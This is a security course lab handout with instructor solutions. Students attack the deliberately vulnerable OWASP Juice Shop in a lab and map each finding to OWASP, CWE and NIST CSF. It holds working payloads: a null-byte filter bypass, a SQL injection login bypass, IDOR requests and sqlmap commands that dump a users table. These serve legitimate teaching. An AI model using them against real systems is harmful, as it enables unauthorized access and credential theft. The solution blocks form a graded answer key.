====== Lab03. Web application security ======

<note important>
**CDCI Framework Context**

Web application vulnerabilities are the most common attack surface on the Internet. This lab maps directly to multiple cyber defense frameworks:
  * **OWASP Top 10 (2021)** — The industry standard for web application security risks. Today you will exploit: //A01 Broken Access Control//, //A03 Injection//, //A05 Security Misconfiguration//
  * **NIST CSF 2.0** — //Protect (PR)//: PR.AA — Identity Management and Access Control, PR.DS — Data Security; //Detect (DE)//: DE.CM — Continuous Monitoring
  * **CWE** — Each exploit in this lab maps to a specific weakness: [[https://cwe.mitre.org/data/definitions/89.html|CWE-89]] (SQL Injection), [[https://cwe.mitre.org/data/definitions/22.html|CWE-22]] (Path Traversal), [[https://cwe.mitre.org/data/definitions/639.html|CWE-639]] (Insecure Direct Object Reference), [[https://cwe.mitre.org/data/definitions/548.html|CWE-548]] (Exposure of Information Through Directory Listing), [[https://cwe.mitre.org/data/definitions/200.html|CWE-200]] (Exposure of Sensitive Information)
  * **MITRE ATT&CK** — T1190 (Exploit Public-Facing Application), T1083 (File and Directory Discovery), T1078 (Valid Accounts via credential theft)

Throughout this lab, pay attention to **why** each vulnerability exists and **which framework control** would have prevented it.
</note>

<note warning>
Important read to be graded!
{{page>:cdci:rec&nofooter&noeditbutton&noheader}}
</note>

===== Objectives =====

  * Scan a web application for security misconfigurations using automated tools
  * Exploit directory listing and path traversal to access sensitive files
  * Perform SQL injection against a REST API to bypass authentication
  * Exploit Insecure Direct Object References (IDOR) to access unauthorized data
  * Automate SQL injection exploitation using sqlmap
  * Classify each finding against OWASP Top 10, CWE, and NIST CSF

===== Target =====

**OWASP Juice Shop** is an intentionally insecure web application for security training. Unlike traditional vulnerable apps that present a menu of attacks, Juice Shop is a realistic e-commerce application where vulnerabilities must be //discovered// — just like in a real penetration test. All challenges are mapped to the OWASP Top 10 and CWEs by the project itself.

<note>
In this lab, all attacks are performed using ''curl'' and command-line tools. No browser is needed.
</note>

==== 02. [15p] Reconnaissance: scanning for misconfigurations ====

<note>
**OWASP A05** — [[https://owasp.org/Top10/A05_2021-Security_Misconfiguration/|Security Misconfiguration]]. Unnecessary features enabled, default configurations, verbose error messages, and exposed sensitive endpoints are all signs of misconfiguration. This maps to **[[https://cwe.mitre.org/data/definitions/200.html|CWE-200]]** (Exposure of Sensitive Information to an Unauthorized Actor) and **[[https://cwe.mitre.org/data/definitions/548.html|CWE-548]]** (Exposure of Information Through Directory Listing).
</note>

In a real engagement, the first step is always reconnaissance. Use ''nmap'' and ''nikto'' to scan the Juice Shop application and discover hidden endpoints.

**Step 1 — Service scan with nmap:**
<code>
root@attacker:/# nmap -sV -T4 10.0.0.3 -p 3000
</code>

**Step 2 — Vulnerability scan with nikto:**
<code>
root@attacker:/# nikto -h http://10.0.0.3:3000
</code>

Review the nikto output carefully. It will report several interesting findings. Write down:
  * What web server and framework is Juice Shop running?
  * Did nikto find any exposed directories or files?
  * Did nikto report any missing security headers?

**Step 3 — Manual endpoint discovery:**

Based on the nikto output and common patterns, probe the following endpoints with ''curl'':
<code>
root@attacker:/# curl -s http://10.0.0.3:3000/ftp/ | head -20
root@attacker:/# curl -s http://10.0.0.3:3000/metrics
root@attacker:/# curl -s http://10.0.0.3:3000/api/SecurityQuestions | jq .
root@attacker:/# curl -s http://10.0.0.3:3000/rest/admin/application-version | jq .
</code>

<note important>
**Questions to answer:**
  - The ''/ftp'' endpoint exposes a directory listing. Which **CWE** is this? (Hint: [[https://cwe.mitre.org/data/definitions/548.html|CWE-548]])
  - The ''/metrics'' endpoint exposes Prometheus operational metrics. Why is this a security risk? Which **NIST CSF** subcategory should ensure this is not publicly exposed? (Hint: PR.AC — Access Control)
  - The ''/api/SecurityQuestions'' endpoint returns all security questions. How could an attacker use this information? Which **MITRE ATT&CK** technique does this enable? (Hint: T1589 — Gather Victim Identity Information)
</note>

<solution>
<code>
root@attacker:/# nmap -sV -T4 10.0.0.3 -p 3000
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework

root@attacker:/# nikto -h http://10.0.0.3:3000
# Output includes:
# - X-Content-Type-Options header not set
# - X-Frame-Options header not set
# - /ftp/ directory found
# - Various other findings

root@attacker:/# curl -s http://10.0.0.3:3000/ftp/
# Returns HTML listing of files: acquisitions.md, coupons_2013.md.bak,
# eastere.gg, encrypt.pyc, incident-support.kdbx, package.json.bak, etc.

root@attacker:/# curl -s http://10.0.0.3:3000/metrics | head -10
# Returns Prometheus metrics: process_cpu_*, http_request_duration_*, etc.

root@attacker:/# curl -s http://10.0.0.3:3000/api/SecurityQuestions | jq .
# Returns all security questions with their IDs

# Answers:
# 1. CWE-548 — Directory listing exposes internal files
# 2. /metrics leaks operational data (memory, CPU, request rates, error rates).
#    NIST CSF PR.AC-4 — Access permissions should follow least privilege.
# 3. Security questions can be used for account takeover (T1589.001 — Credentials)
</code>
</solution>

==== 03. [15p] Sensitive data exposure: path traversal ====

<note>
**OWASP A01** — [[https://owasp.org/Top10/A01_2021-Broken_Access_Control/|Broken Access Control]]. The ''/ftp'' endpoint serves files, but only those with specific extensions (.md, .pdf). However, the input validation can be bypassed. This exploits **[[https://cwe.mitre.org/data/definitions/22.html|CWE-22]]** (Improper Limitation of a Pathname to a Restricted Directory, aka //Path Traversal//) and relates to the well-known **[[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7921|CVE-2017-7921]]** pattern (unauthenticated path traversal leading to sensitive file access).
</note>

You discovered the ''/ftp'' directory in the previous exercise. Now exploit it.

**Step 1 — Download an allowed file:**
<code>
root@attacker:/# curl -s http://10.0.0.3:3000/ftp/acquisitions.md
</code>

This works because ''.md'' files are in the allowlist.

**Step 2 — Try to download a restricted file:**
<code>
root@attacker:/# curl -s http://10.0.0.3:3000/ftp/package.json.bak
</code>

This should fail — the server rejects files with the ''.bak'' extension.

**Step 3 — Bypass the extension filter using the Poison Null Byte:**

The server validates file extensions using a pattern that checks the end of the filename. By injecting a URL-encoded null byte (''%2500''), you can terminate the string early, tricking the validation logic into accepting the file:
<code>
root@attacker:/# curl -s "http://10.0.0.3:3000/ftp/package.json.bak%2500.md"
</code>

The server sees ''.md'' at the end (passes validation), but the filesystem reads ''package.json.bak'' (stops at the null byte).

**Step 4 — Download the Easter egg and the KDBX file:**
<code>
root@attacker:/# curl -s "http://10.0.0.3:3000/ftp/eastere.gg%2500.md"
root@attacker:/# curl -s -o incident-support.kdbx "http://10.0.0.3:3000/ftp/incident-support.kdbx%2500.md"
</code>

<note important>
**Questions to answer:**
  - The null byte trick exploits a mismatch between the web framework's string handling and the filesystem's string handling. Which **CWE** specifically covers null byte injection? (Hint: [[https://cwe.mitre.org/data/definitions/158.html|CWE-158]])
  - The ''package.json.bak'' file may contain dependency versions with known vulnerabilities. Which **OWASP Top 10** category covers using components with known vulnerabilities? (Hint: //A06//)
  - You downloaded a ''.kdbx'' (KeePass database) file. If this contained real credentials, which **NIST CSF** function failed? (Hint: //Protect// — PR.DS — Data Security)
  - Propose one server-side mitigation to prevent the null byte bypass. (Hint: strip or reject null bytes in input)
</note>

<solution>
<code>
root@attacker:/# curl -s http://10.0.0.3:3000/ftp/acquisitions.md
# Returns the contents of the markdown file (merger/acquisition info)

root@attacker:/# curl -s http://10.0.0.3:3000/ftp/package.json.bak
# Returns 403 Forbidden — "Only .md and .pdf files are allowed."

root@attacker:/# curl -s "http://10.0.0.3:3000/ftp/package.json.bak%2500.md"
# Returns the contents of package.json.bak — the null byte bypasses the check!
# This file contains all npm dependencies and their versions.

root@attacker:/# curl -s "http://10.0.0.3:3000/ftp/eastere.gg%2500.md"
# Returns the Easter egg file contents

# Answers:
# 1. CWE-158 (Improper Neutralization of Null Byte or NUL Character)
# 2. OWASP A06 — Vulnerable and Outdated Components
# 3. NIST CSF Protect (PR) — PR.DS-1 (Data-at-rest is protected) — sensitive files
#    should not be accessible via public-facing endpoints
# 4. Mitigation: sanitize input by stripping %00/%2500 null bytes before processing;
#    use a strict allowlist approach matching filename without extension manipulation
</code>
</solution>

==== 04. [20p] SQL injection: REST API login bypass ====

<note>
**OWASP A03** — [[https://owasp.org/Top10/A03_2021-Injection/|Injection]]. SQL injection remains one of the most critical web vulnerabilities. It occurs when user input is concatenated into SQL queries without proper sanitization. This is **[[https://cwe.mitre.org/data/definitions/89.html|CWE-89]]** (Improper Neutralization of Special Elements used in an SQL Command). Famous real-world examples include the 2017 Equifax breach ([[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638|CVE-2017-5638]]) and the 2008 Heartland Payment Systems breach.
</note>

The Juice Shop login endpoint is a REST API at ''/rest/user/login'' that accepts JSON. You will exploit SQL injection to bypass authentication entirely.

**Step 1 — Observe a normal login attempt:**
<code>
root@attacker:/# curl -s http://10.0.0.3:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test"}' | jq .
</code>

You should see an error: "Invalid email or password." Note the response structure.

**Step 2 — Inject SQL into the email field:**

The email field is concatenated into a SQL query like: ''SELECT * FROM Users WHERE email='<input>' AND ...''

By injecting ''' OR 1=1--'' as the email, the query becomes:
''SELECT * FROM Users WHERE email='' OR 1=1--' AND ...''

The ''OR 1=1'' makes the condition always true, and ''--'' comments out the rest of the query. First, save the payload to a file (to avoid shell escaping issues), then send it:
<code>
root@attacker:/# echo '{"email":"'"'"' OR 1=1--","password":"x"}' > payload.json
root@attacker:/# cat payload.json
{"email":"' OR 1=1--","password":"x"}
root@attacker:/# curl -s http://10.0.0.3:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d @payload.json | jq .
</code>

**Step 3 — Extract the authentication token:**

On success, the response contains an ''authentication'' object with a ''token'' (JWT). Extract it:
<code>
root@attacker:/# TOKEN=$(curl -s http://10.0.0.3:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d @payload.json | jq -r '.authentication.token')
root@attacker:/# echo $TOKEN
</code>

**Step 4 — Use the admin token to access restricted endpoints:**
<code>
root@attacker:/# curl -s http://10.0.0.3:3000/rest/admin/application-configuration \
  -H "Authorization: Bearer $TOKEN" | jq '.config.application.name'
</code>

**Step 5 — Decode the JWT to understand what you got:**
<code>
root@attacker:/# echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .
</code>

<note important>
**Questions to answer:**
  - The injected payload ''**' OR 1=1--**'' always returns the **first** user in the database. Why is this the admin? (Hint: think about user creation order)
  - What is a //parameterized query// (prepared statement)? Write a pseudocode example showing the vulnerable query vs. the fixed version.
  - The JWT token is signed but **not encrypted**. Decode it (Step 5) — what user information is exposed? Which **CWE** covers exposing sensitive data in tokens? (Hint: [[https://cwe.mitre.org/data/definitions/315.html|CWE-315]])
  - From a defender's perspective, which **NIST CSF** subcategory should ensure that input validation is implemented? (Hint: PR.DS — Data Security, specifically input sanitization)
</note>

<solution>
<code>
root@attacker:/# curl -s http://10.0.0.3:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test"}' | jq .
{
  "error": "Invalid email or password."
}

root@attacker:/# echo '{"email":"'"'"' OR 1=1--","password":"x"}' > payload.json
root@attacker:/# curl -s http://10.0.0.3:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d @payload.json | jq .
{
  "authentication": {
    "token": "eyJhbGciOi...",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}

root@attacker:/# TOKEN=$(curl -s http://10.0.0.3:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d @payload.json | jq -r '.authentication.token')

root@attacker:/# curl -s http://10.0.0.3:3000/rest/admin/application-configuration \
  -H "Authorization: Bearer $TOKEN" | jq '.config.application.name'
"OWASP Juice Shop"

root@attacker:/# echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .
{
  "status": "success",
  "data": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "role": "admin"
  }
}

# Answers:
# 1. OR 1=1 returns ALL rows; SQL typically returns them in insertion order.
#    The admin is user #1 (first registered). To target a specific user:
#    ' OR email LIKE '%admin%'--
# 2. Vulnerable:  query = "SELECT * FROM Users WHERE email='" + input + "'"
#    Fixed:       query = "SELECT * FROM Users WHERE email = ?"
#                 db.execute(query, [input])  // input is never part of SQL syntax
# 3. JWT payload contains email, role, id — CWE-315 (Cleartext Storage of
#    Sensitive Information in a Cookie). Tokens should not contain sensitive data
#    or should be encrypted (JWE).
# 4. NIST CSF PR.DS — ensure all inputs are validated and sanitized before processing
</code>
</solution>

==== 05. [15p] Broken access control: IDOR and user enumeration ====

<note>
**OWASP A01** — [[https://owasp.org/Top10/A01_2021-Broken_Access_Control/|Broken Access Control]]. Insecure Direct Object References (IDOR) occur when an application uses user-supplied input to directly access objects (database rows, files) without verifying that the user is authorized to access that specific object. This is **[[https://cwe.mitre.org/data/definitions/639.html|CWE-639]]** (Authorization Bypass Through User-Controlled Key).
</note>

You have an admin JWT token from the previous exercise. Now explore what an authenticated attacker can access.

**Step 1 — Access other users' shopping baskets (IDOR):**

Your admin account has ''bid'' (basket ID) 1. Try accessing other users' baskets:
<code>
root@attacker:/# curl -s http://10.0.0.3:3000/rest/basket/1 \
  -H "Authorization: Bearer $TOKEN" | jq .
root@attacker:/# curl -s http://10.0.0.3:3000/rest/basket/2 \
  -H "Authorization: Bearer $TOKEN" | jq .
root@attacker:/# curl -s http://10.0.0.3:3000/rest/basket/3 \
  -H "Authorization: Bearer $TOKEN" | jq .
</code>

**Step 2 — Enumerate all users via the API:**
<code>
root@attacker:/# curl -s http://10.0.0.3:3000/api/Users \
  -H "Authorization: Bearer $TOKEN" | jq '.data[] | {id, email, role}'
</code>

**Step 3 — Access the admin panel:**
<code>
root@attacker:/# curl -s http://10.0.0.3:3000/administration \
  -H "Authorization: Bearer $TOKEN" | head -5
</code>

<note important>
**Questions to answer:**
  - In Step 1, you accessed basket ID 2 and 3 — these belong to other users. Why does the server allow this? What check is missing? (Hint: the server verifies you are //authenticated// but not that you are //authorized// for that specific basket)
  - **[[https://cwe.mitre.org/data/definitions/639.html|CWE-639]]** vs. **[[https://cwe.mitre.org/data/definitions/284.html|CWE-284]]**: what is the difference between IDOR (user-controlled key) and general improper access control? Give an example of each.
  - The ''/api/Users'' endpoint returns all users. Write a one-line curl command that extracts only the email addresses. How could a defender restrict this endpoint?
  - From a **NIST CSF** perspective, which function and subcategory should ensure that users can only access their own data? (Hint: //Protect// — PR.AA)
</note>

<solution>
<code>
root@attacker:/# curl -s http://10.0.0.3:3000/rest/basket/2 \
  -H "Authorization: Bearer $TOKEN" | jq .
# Returns another user's basket contents — IDOR!

root@attacker:/# curl -s http://10.0.0.3:3000/api/Users \
  -H "Authorization: Bearer $TOKEN" | jq '.data[] | {id, email, role}'
{
  "id": 1,
  "email": "admin@juice-sh.op",
  "role": "admin"
}
{
  "id": 2,
  "email": "jim@juice-sh.op",
  "role": "customer"
}
# ... more users

# Extract only emails:
root@attacker:/# curl -s http://10.0.0.3:3000/api/Users \
  -H "Authorization: Bearer $TOKEN" | jq -r '.data[].email'

# Answers:
# 1. The server checks the JWT is valid (authentication) but does NOT check
#    if the basket belongs to the requesting user (authorization). The fix:
#    verify basket.userId == token.userId before returning data.
# 2. CWE-639 (IDOR): user changes basket_id=2 to access another user's data.
#    CWE-284 (Improper Access Control): user accesses /admin without having
#    the admin role at all.
# 3. Defender: restrict /api/Users to admin role only, or return only the
#    current user's data (filter by token.userId).
# 4. NIST CSF Protect (PR) — PR.AA — Identity Management, Authentication,
#    and Access Control: enforce least privilege per user.
</code>
</solution>

==== 06. [20p] Automated SQL injection with sqlmap ====

<note>
**OWASP A03** — [[https://owasp.org/Top10/A03_2021-Injection/|Injection]]. In exercise 04, you performed SQL injection manually. Now you will use **sqlmap**, an automated SQL injection tool, to demonstrate how attackers can extract entire databases in minutes. This reinforces why **[[https://cwe.mitre.org/data/definitions/89.html|CWE-89]]** is considered critical — a single injection point can compromise the entire database.
</note>

**Step 1 — Identify an injectable endpoint:**

The product search endpoint passes user input to a SQL query. The underlying query looks like: ''SELECT * FROM Products WHERE ((name LIKE '%<input>%' OR description LIKE '%<input>%'))''. Notice the double parentheses — your injection must close them.

Test normal behavior first, then inject:
<code>
root@attacker:/# curl -s "http://10.0.0.3:3000/rest/products/search?q=apple" | jq '.data | length'
root@attacker:/# curl -s "http://10.0.0.3:3000/rest/products/search?q='" | jq '.data | length'
root@attacker:/# curl -s "http://10.0.0.3:3000/rest/products/search?q=test'))%20OR%201=1--" | jq '.data | length'
</code>

Compare the results:
  * ''apple'' returns a few matching products (e.g., 3)
  * A single quote returns **0** — the query breaks silently (the error is caught by the application)
  * ''test')) OR 1=1--'' returns **all products** (e.g., 56) — the ''OR 1=1'' makes the WHERE clause always true

<note tip>
Not all SQL injection produces a visible error. In this case, the application catches the error and returns an empty result. This is called **boolean-based blind SQL injection** — you detect it by comparing the number of results between a normal query and an injected one.
</note>

**Step 2 — Run sqlmap to enumerate databases:**
<code>
root@attacker:/# sqlmap -u "http://10.0.0.3:3000/rest/products/search?q=test" \
  --batch --dbs --level=3 --risk=2 --tamper=between
</code>

The ''--batch'' flag runs in non-interactive mode (auto-answers all prompts). The ''--level=3'' increases detection depth, and ''--risk=2'' enables more aggressive tests. Write down the databases found.

**Step 3 — Dump the Users table:**
<code>
root@attacker:/# sqlmap -u "http://10.0.0.3:3000/rest/products/search?q=test" \
  --batch -D main -T Users --dump --level=3 --risk=2 --tamper=between
</code>

<note warning>
sqlmap may take several minutes to run. This is expected. Use ''--threads=4'' to speed it up.
</note>

**Step 4 — Compare manual vs automated results:**

Look at the dumped Users table. You should see usernames, emails, password hashes, and roles — the same information you accessed via the API in exercise 05, but obtained through a completely different attack vector.

<note important>
**Questions to answer:**
  - You manually exploited the login endpoint (exercise 04) and sqlmap automated the search endpoint (this exercise). Both exploit **[[https://cwe.mitre.org/data/definitions/89.html|CWE-89]]**. How many injectable endpoints might exist in a large application? Why is automated scanning essential?
  - sqlmap found the password hashes. If these were stored as unsalted MD5 (like **[[https://cwe.mitre.org/data/definitions/328.html|CWE-328]]** — Use of Weak Hash), how quickly could they be cracked? (Hint: recall lab02 exercise 11)
  - From a **NIST CSF** perspective: the //Detect// function (DE.CM — Continuous Monitoring) should catch automated SQL injection attempts. What would a WAF (Web Application Firewall) or IDS alert look like for sqlmap traffic? (Hint: think about request patterns, User-Agent headers)
  - Propose a defense-in-depth strategy against SQL injection. Name at least 3 layers: (a) code-level, (b) infrastructure-level, (c) monitoring-level.
</note>

<solution>
<code>
root@attacker:/# curl -s "http://10.0.0.3:3000/rest/products/search?q=apple" | jq '.data | length'
3
root@attacker:/# curl -s "http://10.0.0.3:3000/rest/products/search?q='" | jq '.data | length'
0
# The single quote breaks the query — but the error is silenced (returns empty).
# This is boolean-based blind SQLi: 0 results = broken query.

root@attacker:/# curl -s "http://10.0.0.3:3000/rest/products/search?q=test'))%20OR%201=1--" | jq '.data | length'
56
# OR 1=1 returns ALL products — confirms injection works.
# The ')) closes the double parentheses in: WHERE ((name LIKE '%test%'...))

root@attacker:/# sqlmap -u "http://10.0.0.3:3000/rest/products/search?q=test" \
  --batch --dbs --level=3 --risk=2 --tamper=between
# Output:
# available databases [1]:
# [*] main

root@attacker:/# sqlmap -u "http://10.0.0.3:3000/rest/products/search?q=test" \
  --batch -D main -T Users --dump --level=3 --risk=2 --tamper=between
# Dumps the entire Users table with columns:
# id, username, email, password (hashed), role, ...
# Includes admin@juice-sh.op, jim@juice-sh.op, etc.

# Answers:
# 1. Large applications can have hundreds of endpoints, each potentially injectable.
#    Manual testing is infeasible at scale — automated tools like sqlmap, Burp Suite,
#    or OWASP ZAP are essential for security assessments.
# 2. Unsalted MD5: a modern GPU cracks ~50 billion MD5/sec. An 8-char password
#    (26^8 ≈ 2×10^11) would take ~4 seconds. With bcrypt (cost 12): ~1,585 years.
# 3. sqlmap signatures: rapid sequential requests to same endpoint, varying quote chars,
#    UNION SELECT payloads, User-Agent "sqlmap/x.x". WAF rules detect these patterns.
# 4. Defense-in-depth:
#    (a) Code: parameterized queries / prepared statements (eliminates CWE-89)
#    (b) Infrastructure: WAF (ModSecurity, AWS WAF) + least-privilege DB accounts
#    (c) Monitoring: IDS/IPS rules for SQLi patterns, anomaly detection on query rates,
#        SIEM alerts on error spikes (500 responses)
</code>
</solution>

==== 07. [5p] Framework mapping — classify your findings ====

<note>
This is the most important exercise from a CDCI perspective. Cyber defense is not just about //finding// vulnerabilities — it is about //classifying// them using industry-standard frameworks so that organizations can prioritize remediation, communicate risk to management, and comply with regulations (NIS2, GDPR, PCI DSS).
</note>

For each exploit you performed in exercises 02-06, fill in the following table. Use the references provided throughout the lab.

^ Exercise ^ Attack performed ^ OWASP Top 10 ^ CWE-ID ^ NIST CSF Function & Subcategory ^ Proposed Mitigation ^
| 02 | Directory listing + exposed metrics | ? | ? | ? | ? |
| 03 | Path traversal via null byte  | ? | ? | ? | ? |
| 04 | SQL injection login bypass | ? | ? | ? | ? |
| 05 | IDOR + user enumeration | ? | ? | ? | ? |
| 06 | Automated SQLi (sqlmap) | ? | ? | ? | ? |

<note important>
**Guidelines for filling the table:**
  * **OWASP Top 10**: Use the 2021 edition codes (A01-A10). Full list: [[https://owasp.org/Top10/|owasp.org/Top10]]
  * **CWE-ID**: Link to the specific CWE entry. Use [[https://cwe.mitre.org|cwe.mitre.org]] to look up IDs.
  * **NIST CSF**: State which function (Identify/Protect/Detect/Respond/Recover) and subcategory (e.g., PR.DS-1) **should have prevented** the attack.
  * **Mitigation**: One concrete, actionable fix (e.g., "use parameterized queries", not "fix the code").
</note>

<solution>
^ Exercise ^ Attack performed ^ OWASP Top 10 ^ CWE-ID ^ NIST CSF Function & Subcategory ^ Proposed Mitigation ^
| 02 | Directory listing, exposed /metrics | A05 Security Misconfiguration | CWE-548, CWE-200 | PR.AC-4 (Access Control) | Disable directory listing; restrict /metrics to internal network/auth |
| 03 | Null byte path traversal | A01 Broken Access Control | CWE-22, CWE-158 | PR.DS-1 (Data-at-rest protection) | Sanitize null bytes in input; use allowlist for accessible files |
| 04 | SQL injection login bypass | A03 Injection | CWE-89 | PR.DS (Input validation) | Use parameterized queries / prepared statements |
| 05 | IDOR on baskets + user enum | A01 Broken Access Control | CWE-639, CWE-284 | PR.AA (Access Control) | Verify object ownership server-side before returning data |
| 06 | Automated SQLi (sqlmap) | A03 Injection | CWE-89 | DE.CM (Continuous Monitoring) | WAF + parameterized queries + rate limiting + IDS alerts |
